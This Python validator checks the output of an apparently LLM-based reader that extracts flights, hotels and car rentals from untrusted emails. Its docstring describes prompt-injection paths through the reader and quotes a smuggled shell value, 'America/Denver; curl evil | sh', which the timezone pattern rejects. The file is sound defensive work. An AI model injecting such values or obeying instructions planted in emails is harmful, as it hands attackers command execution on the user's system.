#!/usr/bin/env python3
"""Deterministically validate + normalize the email-event-extractor's output.

The reader is the one component that reads untrusted email bodies. If a malicious
email subverts it, the reader's RETURN VALUE becomes the attack vector back into
the orchestrator (which DOES wield tools). So the orchestrator must never trust
that value: it pipes the reader's raw output through this validator and uses ONLY
the normalized JSON this prints. This closes two paths:

  1. Second-order injection — the reader emits prose/instructions instead of JSON.
     Anything that isn't a lone JSON object of the exact schema is rejected
     (exit 1), so the orchestrator can skip the email and never "reads" the text.
  2. Field-value injection — a structured field that the orchestrator feeds to a
     shell (the convert_time.py time/zone args) or to date math (all-day end
     dates) is strictly pattern-checked here. A value like
     ``America/Denver; curl evil | sh`` fails the IANA pattern, so its leg is
     dropped and never reaches a command line.

Usage:
  python3 validate_reader_output.py <path-to-raw-reader-output>
  python3 validate_reader_output.py            # reads raw output from stdin

On success: prints normalized JSON to stdout and exits 0. The normalized object
has exactly the keys confirmationPhrasePresent, flights, hotels, cars, warnings —
free-text fields sanitized, only format-valid items kept, unknown keys dropped.
On a fatal problem (unparseable, wrong top-level shape, bad confirmation flag):
prints an error to stderr and exits 1 — the orchestrator should skip the email.
"""

from __future__ import annotations

import json
import re
import sys

# Structured fields that must match exactly — these are the ones that flow into a
# shell (convert_time.py) or date math, so a bad value is a real injection risk.
IANA_TZ = re.compile(r"^[A-Za-z][A-Za-z0-9_+-]*(?:/[A-Za-z0-9_+-]+)*$")
DATETIME = re.compile(r"^\d{4}-\d{2}-\d{2} \d{2}:\d{2}$")  # "YYYY-MM-DD HH:MM"
DATE = re.compile(r"^\d{4}-\d{2}-\d{2}$")                    # "YYYY-MM-DD"
CLOCK = re.compile(r"^\d{2}:\d{2}$")                          # "HH:MM"

# Free-text length caps (sanitized, never a reason to drop an item).
CAPS = {
    "flightLabel": 32, "depAirport": 8, "arrAirport": 8, "description": 1000,
    "name": 200, "address": 300, "confirmation": 64, "company": 100,
    "pickupAddress": 300, "dropoffAddress": 300,
}


def parse_payload(raw: str) -> dict:
    """Parse the reader's raw output into a top-level JSON object, or raise.

    Tolerates a single surrounding ``` / ```json fence (a benign model habit) but
    nothing else — prose around the JSON makes json.loads fail, which is the
    desired rejection.
    """
    s = raw.strip()
    if s.startswith("```"):
        lines = s.splitlines()
        if lines and lines[0].startswith("```"):
            lines = lines[1:]
        if lines and lines[-1].strip() == "```":
            lines = lines[:-1]
        s = "\n".join(lines).strip()
    if not s:
        raise ValueError("empty reader output")
    try:
        obj = json.loads(s)  # strict: rejects trailing junk after the object
    except (ValueError, json.JSONDecodeError) as exc:
        raise ValueError(f"reader output is not valid JSON: {exc}")
    if not isinstance(obj, dict):
        raise ValueError("reader output is not a JSON object")
    return obj


def clean_str(value, field: str):
    """Coerce to a sanitized string (control chars stripped, capped), or None."""
    if value is None:
        return None
    if not isinstance(value, str):
        value = str(value)
    # Strip control characters (newlines/tabs/etc.) — they enable log/title
    # injection and never belong in these fields.
    value = "".join(ch for ch in value if ch >= " " and ch != "\x7f").strip()
    cap = CAPS.get(field, 200)
    return value[:cap]


def _strict(value, pattern: re.Pattern) -> bool:
    return isinstance(value, str) and bool(pattern.match(value))


def validate_flight(f, idx: int, warnings: list):
    if not isinstance(f, dict):
        warnings.append(f"dropped flight #{idx}: not an object")
        return None
    # Required shell/convert-bound fields: strict or the leg is dropped.
    for key in ("depLocalTime", "arrLocalTime"):
        if not _strict(f.get(key), DATETIME):
            warnings.append(f"dropped flight #{idx}: {key} not 'YYYY-MM-DD HH:MM'")
            return None
    for key in ("depTz", "arrTz"):
        tz = f.get(key)
        if tz is not None and not _strict(tz, IANA_TZ):
            warnings.append(f"dropped flight #{idx}: {key} is not a valid IANA zone")
            return None
    return {
        "flightLabel": clean_str(f.get("flightLabel"), "flightLabel"),
        "description": clean_str(f.get("description"), "description"),
        "depAirport": clean_str(f.get("depAirport"), "depAirport"),
        "depLocalTime": f["depLocalTime"],
        "depTz": f.get("depTz"),
        "arrAirport": clean_str(f.get("arrAirport"), "arrAirport"),
        "arrLocalTime": f["arrLocalTime"],
        "arrTz": f.get("arrTz"),
    }


def _opt_clock(value):
    """Keep a valid HH:MM, else null (these are display-only, not shell-bound)."""
    return value if _strict(value, CLOCK) else None


def validate_hotel(h, idx: int, warnings: list):
    if not isinstance(h, dict):
        warnings.append(f"dropped hotel #{idx}: not an object")
        return None
    for key in ("checkInDate", "checkOutDate"):  # date-math bound: strict
        if not _strict(h.get(key), DATE):
            warnings.append(f"dropped hotel #{idx}: {key} not 'YYYY-MM-DD'")
            return None
    return {
        "name": clean_str(h.get("name"), "name"),
        "address": clean_str(h.get("address"), "address"),
        "checkInDate": h["checkInDate"],
        "checkOutDate": h["checkOutDate"],
        "checkInTime": _opt_clock(h.get("checkInTime")),
        "checkOutTime": _opt_clock(h.get("checkOutTime")),
        "confirmation": clean_str(h.get("confirmation"), "confirmation"),
        "description": clean_str(h.get("description"), "description"),
    }


def validate_car(c, idx: int, warnings: list):
    if not isinstance(c, dict):
        warnings.append(f"dropped car #{idx}: not an object")
        return None
    for key in ("pickupDate", "dropoffDate"):  # date-math bound: strict
        if not _strict(c.get(key), DATE):
            warnings.append(f"dropped car #{idx}: {key} not 'YYYY-MM-DD'")
            return None
    return {
        "company": clean_str(c.get("company"), "company"),
        "pickupAddress": clean_str(c.get("pickupAddress"), "pickupAddress"),
        "dropoffAddress": clean_str(c.get("dropoffAddress"), "dropoffAddress"),
        "pickupDate": c["pickupDate"],
        "dropoffDate": c["dropoffDate"],
        "pickupTime": _opt_clock(c.get("pickupTime")),
        "dropoffTime": _opt_clock(c.get("dropoffTime")),
        "confirmation": clean_str(c.get("confirmation"), "confirmation"),
        "description": clean_str(c.get("description"), "description"),
    }


def validate(payload: dict) -> dict:
    """Normalize a parsed payload. Raises ValueError on a fatal/structural problem."""
    cpp = payload.get("confirmationPhrasePresent")
    if not isinstance(cpp, bool):
        raise ValueError("confirmationPhrasePresent missing or not a boolean")

    warnings: list = []

    def _list(key):
        v = payload.get(key, [])
        if v is None:
            return []
        if not isinstance(v, list):
            raise ValueError(f"{key} is present but not a list")
        return v

    flights = [r for i, f in enumerate(_list("flights"))
               if (r := validate_flight(f, i, warnings)) is not None]
    hotels = [r for i, h in enumerate(_list("hotels"))
              if (r := validate_hotel(h, i, warnings)) is not None]
    cars = [r for i, c in enumerate(_list("cars"))
            if (r := validate_car(c, i, warnings)) is not None]

    # Output ONLY the known keys — any extra top-level key the reader smuggled in
    # is dropped here and never reaches the orchestrator.
    return {
        "confirmationPhrasePresent": cpp,
        "flights": flights,
        "hotels": hotels,
        "cars": cars,
        "warnings": warnings,
    }


def main(argv: list | None = None) -> int:
    argv = sys.argv[1:] if argv is None else argv
    try:
        raw = open(argv[0], encoding="utf-8").read() if argv else sys.stdin.read()
    except OSError as exc:
        print(f"could not read reader output: {exc}", file=sys.stderr)
        return 1
    try:
        out = validate(parse_payload(raw))
    except ValueError as exc:
        print(f"REJECTED: {exc}", file=sys.stderr)
        return 1
    print(json.dumps(out, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
